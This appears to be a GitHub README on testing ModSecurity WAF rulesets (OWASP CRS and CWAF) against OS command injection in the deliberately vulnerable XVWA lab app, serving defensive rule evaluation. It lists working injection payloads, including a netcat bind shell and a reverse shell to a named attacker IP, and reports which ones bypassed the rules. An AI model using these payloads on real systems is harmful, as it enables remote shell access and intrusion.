# WAF-Rule-Testing (OS Command injection Rules)
Testing OS command injection attack on vulnerable application with OWASP CRS && CWAF Ruleset.

**How to identify the flaw on OWASP CRS && CWAF Ruleset?**

    1. At first, set up the vulnerable application i.e xvwa,OWASP Mutillidae Vulnerable App on the server for testing WAF rules.
    2. Install modsecurity and include both OWASP CRS && CWAF ruleset in apache config.
    3. Before testing t Vulnerable app, have a complete knowledge about OWASP TOP 10 vulnerability 
       
       How it works?
       How to exploit it?
       What are the modern evasion technique to bypass WAF rules?
    
    4. Read the Modsecurity Reference manual on Github
    
        Understand how modsecurity works ?
        start analyse the rules?
        Break the regex and analyse how it was developed?
        Start testing regex pattern to understand how prefect it detect payloads? 
        
    5. Start testing the vulnerable app. 
    
**How to test OS command Injection attack on vulnerable application with OWASP CRS && CWAF Ruleset?**
        
    1. Install Modsecurity and Configure OWASP CRS & CWAF rule set.
    2. Install xvwa app and COnfigure it with database.
    3. start testing the XVWA app for OS commands injection.
    
 **Test OS Command injection attack on OWASP CRS**
    
     Note: We can use && or | or ; to pipe the command to execute.
     Include the OWASP CRS on apache config:
    
     Test these following payloads on the xvwa vulnerable application for OS command injection.
     
        127.0.0.1 && cd /root/Desktop/ && pwd && service --status-all 
        127.0.0.1 && ps
        127.0.0.1 && service mysql status
        127.0.0.1 && service apache2 status
    
     As a result, OWASP CRS failed to detect these above Injection Payloads, but it block almost ever major OS Commands injection 
     payloads from execution on server.
     Check the demo video to know more :)
 
 **Test OS Command injection attack on CWAF Ruleset**
    
     Note: We can use && or | or ; to pipe the command to execute.
     Include the CWAF ruleset on apache config:
     
     Test these following payloads on the xvwa vulnerable application for OS command injection.
       
        127.0.0.1 && cd /root/Desktop/ && pwd && ps && service --status-all 
        127.0.0.1 && cat index.php
        127.0.0.1 && echo "tell me whoami?  I am Human or AI :)"
        127.0.0.1 && nc -ln -e /bin/sh -p 9999
        127.0.0.1 && uname -a
        127.0.0.1 && netstat -ltnp | grep '80'

        Let try reverse shell scenario:
        127.0.0.1 && nc -c /bin/sh 192.168.1.12 9999
        Attacker IP - 192.168.1.12
        Attacker Listener port: 9999 

      As a resut, CWAF failed to detect the major OS command injection attack on the application, which lead us to get reverse shell on the server.
      Check the demo video to know more :)
      
## Demo Video
  
   [![Alt text](https://img.youtube.com/vi/U5qmi_yoMQA/0.jpg)](https://www.youtube.com/watch?v=U5qmi_yoMQA)

## Support !
 Email address: umarfarookmech712@gmail.com  for more details. <br>
 Youtube: [FOS](https://www.youtube.com/channel/UCEBHO0kD1WFvIhf9wBCU-VQ) <br>
 Blog: [FOS](https://fosecurity.blogspot.com) 

## Useful links:
 1. [Modsecurity](www.modsecurity.com/)
 2. [Kali](https://www.kali.org/)
 3. [Debuggex](https://www.debuggex.com/)
 4. [OWASP Mutillidae Vulnerable App](https://www.owasp.org/index.php/OWASP_Mutillidae_2_Project)
 5. [XVWA](https://github.com/s4n7h0/xvwa)
 6. [Modsecurity Reference Manual](https://github.com/SpiderLabs/ModSecurity/wiki/Reference-Manual#UNIX)
